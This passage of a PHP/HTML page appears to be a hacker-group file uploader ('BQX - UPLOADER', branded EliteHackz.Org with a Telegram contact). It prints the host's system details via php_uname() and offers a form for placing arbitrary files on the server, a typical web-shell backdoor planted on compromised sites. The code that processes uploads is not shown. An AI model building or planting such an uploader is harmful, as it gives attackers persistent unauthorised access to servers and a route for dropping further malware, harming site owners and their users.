...
<title>BQX - UPLOADER</title>
</head>
<body class="bg-dark">
<br>
<center><img width="285" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT38aLLjRXzWw_2YDwSl-3Ss5CjbNv2PJ5x_o5wai5tb488fEEDI4lS-OZUN6Z__C1fYrU&usqp=CAU" alt=""></center>
<br>
<center>
<div class="alert alert-primary w-25"><?php echo php_uname(); ?></div>

<form action="" method="POST" enctype="multipart/form-data">
<input type="hidden" name="text"/>
<label class="form-label" for="customFile">Sisteme Yükleyeceğin Dosyayı Seç.</label>
<input name="file" class="form-control w-25" id="customFile" type="file" />
<br>
<button class="btn btn-light w-25">Yükle</button>
</form><br>
<audio type="mp3" autoplay="1" controls="" src="https://h.top4top.io/m_2194ivhfg1.mp3"></audio><br><button type="button" color="black" onclick="alert('Telegram: ElitexB')">Contact Me!</button><br><font face="courier" size="2" color="white">-= EliteHackz.Org =-<br>
</center>
